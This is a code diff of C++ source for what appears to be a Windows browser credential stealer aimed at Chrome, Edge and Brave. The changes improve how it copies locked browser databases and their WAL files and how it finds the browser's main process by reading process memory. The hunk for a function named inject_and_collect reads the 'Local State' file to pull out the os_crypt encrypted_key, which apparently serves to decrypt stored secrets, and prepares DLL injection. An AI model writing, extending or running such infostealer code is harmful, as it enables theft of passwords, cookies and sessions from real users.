@@ -198,8 +198,8 @@ std::string wstring_to_utf8(const std::wstring& wstr) {
 
 bool copy_single_file(const fs::path& source, const fs::path& dest) {
     if (CopyFileW(source.c_str(), dest.c_str(), FALSE)) return true;
-    for (int i = 0; i < 3; i++) {
-        HANDLE h_src = CreateFileW(source.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+    for (int i = 0; i < 5; i++) {
+        HANDLE h_src = CreateFileW(source.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, nullptr);
         if (h_src != INVALID_HANDLE_VALUE) {
             HANDLE h_dest = CreateFileW(dest.c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
             if (h_dest != INVALID_HANDLE_VALUE) {
@@ -219,29 +219,24 @@ bool copy_single_file(const fs::path& source, const fs::path& dest) {
                 CloseHandle(h_src);
             }
         }
-        Sleep(200);
+        Sleep(500);
     }
     return false;
 }
 
 bool copy_file_locked(const fs::path& source, const fs::path& dest) {
     if (!copy_single_file(source, dest)) return false;
-
-    fs::path wal = source.string() + "-wal";
-    if (fs::exists(wal)) copy_single_file(wal, dest.string() + "-wal");
-
-    fs::path journal = source.string() + "-journal";
-    if (fs::exists(journal)) copy_single_file(journal, dest.string() + "-journal");
-
-    fs::path shm = source.string() + "-shm";
-    if (fs::exists(shm)) copy_single_file(shm, dest.string() + "-shm");
-
+    std::wstring src_w = source.wstring();
+    std::wstring dst_w = dest.wstring();
+    copy_single_file(src_w + L"-wal", dst_w + L"-wal");
+    copy_single_file(src_w + L"-journal", dst_w + L"-journal");
+    copy_single_file(src_w + L"-shm", dst_w + L"-shm");
     return true;
 }
 
 int open_db_readonly(const std::string& path, sqlite3** db) {
-    std::string uri = "file:" + path + "?mode=ro";
-    return sqlite3_open_v2(uri.c_str(), db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI | SQLITE_OPEN_NOMUTEX, nullptr);
+    // 2026 Solution: Open temp copy as READWRITE to allow WAL recovery even if original is locked.
+    return sqlite3_open_v2(path.c_str(), db, SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE | SQLITE_OPEN_NOMUTEX, nullptr);
 }
 
 void cleanup_db_temp(const fs::path& path) {
@@ -278,38 +273,60 @@ std::wstring find_browser_exe(const std::wstring& name) {
     return L"";
 }
 
+#include <ntstatus.h>
+#include <winternl.h>
+
+typedef NTSTATUS (NTAPI *_NtQueryInformationProcess)(
+    HANDLE ProcessHandle,
+    DWORD ProcessInformationClass,
+    PVOID ProcessInformation,
+    DWORD ProcessInformationLength,
+    PDWORD ReturnLength
+);
+
 DWORD find_main_process(const std::wstring& exe_name) {
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snapshot == INVALID_HANDLE_VALUE) return 0;
-
     PROCESSENTRY32W entry;
     entry.dwSize = sizeof(PROCESSENTRY32W);
+    DWORD main_pid = 0;
 
-    std::vector<DWORD> pids;
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    auto NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
+
     if (Process32FirstW(snapshot, &entry)) {
         do {
             std::wstring current_exe = entry.szExeFile;
-            std::wstring exe_name_lower = exe_name;
-            std::wstring current_exe_lower = current_exe;
-            std::transform(exe_name_lower.begin(), exe_name_lower.end(), exe_name_lower.begin(), ::towlower);
-            std::transform(current_exe_lower.begin(), current_exe_lower.end(), current_exe_lower.begin(), ::towlower);
-
-            if (current_exe_lower == exe_name_lower) {
-                pids.push_back(entry.th32ProcessID);
+            std::wstring target_exe = exe_name;
+            std::transform(current_exe.begin(), current_exe.end(), current_exe.begin(), ::towlower);
+            std::transform(target_exe.begin(), target_exe.end(), target_exe.begin(), ::towlower);
+            if (current_exe == target_exe) {
+                HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, entry.th32ProcessID);
+                if (h) {
+                    bool is_main = true;
+                    PROCESS_BASIC_INFORMATION pbi;
+                    if (NtQueryInformationProcess(h, 0, &pbi, sizeof(pbi), NULL) == 0) {
+                        PEB peb;
+                        if (ReadProcessMemory(h, pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
+                            RTL_USER_PROCESS_PARAMETERS params;
+                            if (ReadProcessMemory(h, peb.ProcessParameters, &params, sizeof(params), NULL)) {
+                                wchar_t cmd_line[4096];
+                                if (ReadProcessMemory(h, params.CommandLine.Buffer, cmd_line, std::min((USHORT)4095, params.CommandLine.Length), NULL)) {
+                                    std::wstring cmd(cmd_line);
+                                    if (cmd.find(L"--type=") != std::wstring::npos) is_main = false;
+                                }
+                            }
+                        }
+                    }
+                    CloseHandle(h);
+                    if (is_main) {
+                        main_pid = entry.th32ProcessID;
+                        break;
+                    }
+                }
             }
         } while (Process32NextW(snapshot, &entry));
     }
-
-    DWORD main_pid = 0;
-    for (DWORD pid : pids) {
-        HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-        if (h) {
-            main_pid = pid;
-            CloseHandle(h);
-            break;
-        }
-    }
-
     CloseHandle(snapshot);
     return main_pid;
 }
@@ -423,14 +440,25 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
     char* user_profile_env = getenv("USERPROFILE");
     if (user_profile_env) {
         fs::path user_profile(user_profile_env);
+        fs::path temp_dir = user_profile / "AppData/Local/Temp/chrome_db";
+        fs::create_directories(temp_dir);
+
         fs::path data_path;
         if (browser.name == L"Chrome") data_path = user_profile / "AppData/Local/Google/Chrome/User Data";
         else if (browser.name == L"Edge") data_path = user_profile / "AppData/Local/Microsoft/Edge/User Data";
         else data_path = user_profile / "AppData/Local/BraveSoftware/Brave-Browser/User Data";
 
         std::string ls_str;
-        std::ifstream ls_file(data_path / "Local State");
-        if (ls_file) ls_str.assign((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());
+        fs::path ls_path = data_path / "Local State";
+        fs::path ls_tmp = temp_dir / "ls.tmp";
+        if (copy_file_locked(ls_path, ls_tmp)) {
+            std::ifstream ls_file(ls_tmp);
+            if (ls_file) ls_str.assign((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());
+            fs::remove(ls_tmp);
+        } else {
+            std::ifstream ls_file(ls_path);
+            if (ls_file) ls_str.assign((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());
+        }
 
         json ls_json = json::parse(ls_str, nullptr, false);
         if (!ls_json.is_discarded() && ls_json.contains("os_crypt") && ls_json["os_crypt"].contains("encrypted_key")) {
@@ -459,9 +487,6 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
         for (const auto& entry : fs::directory_iterator(data_path)) {
             if (entry.is_directory() && entry.path().filename().string().find("Profile ") == 0) profiles.push_back(entry.path().filename().string());
         }
-
-        fs::path temp_dir = user_profile / "AppData/Local/Temp/chrome_db";
-        fs::create_directories(temp_dir);
 
         json collected = json::array();
 
